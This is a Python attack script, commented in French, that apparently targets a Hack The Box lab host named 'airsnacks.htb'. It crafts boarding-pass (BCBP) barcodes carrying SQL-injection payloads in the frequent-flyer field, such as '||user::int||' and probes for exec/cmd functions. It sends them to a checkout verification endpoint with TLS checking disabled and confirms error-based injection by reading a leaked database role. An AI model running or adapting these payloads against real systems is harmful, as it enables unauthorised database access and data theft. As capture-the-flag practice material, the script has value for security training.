#!/usr/bin/env python3

"""Automatise les probes BCBP/SQLi non destructifs sur AirSnacks."""

import argparse
import json
import ssl
import sys
import time
import urllib.error
import urllib.request
from http.cookiejar import CookieJar


DEFAULT_BASE_URL = "https://airsnacks.htb"
DEFAULT_SKU = "SNK-CRN"

# Le champ frequent-flyer number ne mesure que 16 caractères. Les probes
# ci-dessous restent des expressions intégrées à l'INSERT et ne modifient pas
# le schéma ou les données existantes.
DEFAULT_PROBES = {
    "baseline": "ABC1234567890123",
    "quote/error": "A'B",
    "current_user": "'||user::int||'",
    "pi_expression": "'||pi()||'",
    "missing_exec": "'||exec()||'",
    "missing_cmd": "'||cmd()||'",
    "missing_run": "'||run()||'",
    "missing_sys": "'||sys()||'",
}


def fixed(value, width, field_name):
    value = str(value).upper()
    if len(value) > width:
        raise ValueError(
            f"{field_name}: {len(value)} caractères, maximum {width}"
        )
    return value.ljust(width)


def build_bcbp(ff_number="ABC1234567890123", security_data=None):
    """Construit un BCBP mono-segment avec item 17=0x25."""
    mandatory = "".join(
        [
            fixed("M", 1, "format"),
            fixed("1", 1, "legs"),
            fixed("DOE/JOHN", 20, "passenger name"),
            fixed("E", 1, "electronic ticket"),
            fixed("ABC1234", 7, "PNR"),
            fixed("CDG", 3, "origin"),
            fixed("JFK", 3, "destination"),
            fixed("AF", 3, "carrier"),
            fixed("0123A", 5, "flight"),
            fixed("297", 3, "julian date"),
            fixed("Y", 1, "cabin"),
            fixed("012A", 4, "seat"),
            fixed("0001 ", 5, "sequence"),
            fixed("1", 1, "passenger status"),
        ]
    )

    # Unique conditional data (11 octets).
    unique = "   " + "6297" + "B" + "AF "
    assert len(unique) == 11

    # Repeated conditional data jusqu'au frequent-flyer number.
    repeated = "".join(
        [
            "057",                  # Airline numeric code
            "1234567890",           # Document serial
            " ",                    # Selectee indicator
            " ",                    # International documents
            "AF ",                  # Marketing carrier
            "AF ",                  # Frequent-flyer carrier
            fixed(ff_number, 16, "frequent-flyer number"),
        ]
    )
    assert len(repeated) == 0x25

    conditional = ">50B" + unique + "25" + repeated
    assert len(conditional) == 0x36
    raw = mandatory + f"{len(conditional):02X}" + conditional

    if security_data is not None:
        if len(security_data) > 0xFF:
            raise ValueError("security data: maximum 255 caractères")
        raw += f"^1{len(security_data):02X}{security_data}"

    return raw


class Client:
    def __init__(self, base_url, timeout):
        self.base_url = base_url.rstrip("/")
        self.timeout = timeout
        self.cookies = CookieJar()
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        self.opener = urllib.request.build_opener(
            urllib.request.HTTPCookieProcessor(self.cookies),
            urllib.request.HTTPSHandler(context=context),
        )

    def request(self, path, method="GET", body=None):
        data = None
        headers = {}
        if body is not None:
            data = json.dumps(body).encode()
            headers["Content-Type"] = "application/json"

        request = urllib.request.Request(
            self.base_url + path,
            data=data,
            headers=headers,
            method=method,
        )
        started = time.monotonic()
        try:
            response = self.opener.open(request, timeout=self.timeout)
            raw_body = response.read().decode(errors="replace")
            status = response.status
        except urllib.error.HTTPError as error:
            status = error.code
            raw_body = error.read().decode(errors="replace")
        except urllib.error.URLError as error:
            elapsed = time.monotonic() - started
            return 0, elapsed, {"network_error": str(error.reason)}
        except TimeoutError:
            elapsed = time.monotonic() - started
            return 0, elapsed, {"network_error": "connection timed out"}

        elapsed = time.monotonic() - started
        try:
            parsed = json.loads(raw_body)
        except json.JSONDecodeError:
            parsed = {"raw_response": raw_body}
        return status, elapsed, parsed

    def create_cart(self, sku):
        return self.request("/cart/add", "POST", {"sku": sku})

    def verify(self, raw_bcbp):
        return self.request(
            "/checkout/boarding-pass/verify",
            "POST",
            {"raw": raw_bcbp},
        )


def compact_response(response):
    interesting = [
        "error",
        "detail",
        "item",
        "audit_ref",
        "dest",
        "regime",
        "exempt",
    ]
    return {key: response[key] for key in interesting if key in response}


def run_probe(client, name, payload, security_data=None):
    raw = build_bcbp(payload, security_data=security_data)
    status, elapsed, response = client.verify(raw)
    print(f"\n[{name}] payload={payload!r} len={len(payload)}")
    print(f"HTTP {status} - {elapsed:.3f}s - BCBP {len(raw)} octets")
    print(json.dumps(compact_response(response), indent=2, ensure_ascii=False))
    return status, response


def parse_args():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--url", default=DEFAULT_BASE_URL)
    parser.add_argument("--sku", default=DEFAULT_SKU)
    parser.add_argument("--timeout", type=float, default=10)
    parser.add_argument(
        "--payload",
        action="append",
        default=[],
        help="probe FF personnalisé (16 caractères maximum, option répétable)",
    )
    parser.add_argument(
        "--security-test",
        action="store_true",
        help="ajoute un test montrant que la security data est acceptée",
    )
    parser.add_argument(
        "--show-raw",
        action="store_true",
        help="affiche un BCBP étendu de référence",
    )
    return parser.parse_args()


def main():
    args = parse_args()
    for payload in args.payload:
        if len(payload) > 16:
            print(
                f"Payload refusé ({len(payload)}/16 caractères): {payload!r}",
                file=sys.stderr,
            )
            return 2

    if args.show_raw:
        raw = build_bcbp()
        print("=== BCBP étendu de référence ===")
        print(repr(raw))
        print("Longueur:", len(raw))

    client = Client(args.url, args.timeout)
    status, elapsed, response = client.create_cart(args.sku)
    print("=== Session/panier ===")
    print(f"HTTP {status} - {elapsed:.3f}s")
    print(json.dumps(response, indent=2, ensure_ascii=False))
    if status != 200:
        print("Impossible de créer le panier actif.", file=sys.stderr)
        return 1

    probes = dict(DEFAULT_PROBES)
    for index, payload in enumerate(args.payload, start=1):
        probes[f"custom_{index}"] = payload

    results = {}
    for name, payload in probes.items():
        results[name] = run_probe(client, name, payload)

    if args.security_test:
        run_probe(client, "security_data_255", probes["baseline"], "A" * 255)

    current_user = results.get("current_user", ({}, {}))[1].get("detail", "")
    print("\n=== Résumé ===")
    if "airsnacks_app" in current_user:
        print("[+] SQLi error-based confirmée; rôle DB: airsnacks_app")
    else:
        print("[-] Le probe current_user n'a pas reproduit la fuite attendue")
    print("[*] Les probes fournis sont non destructifs.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
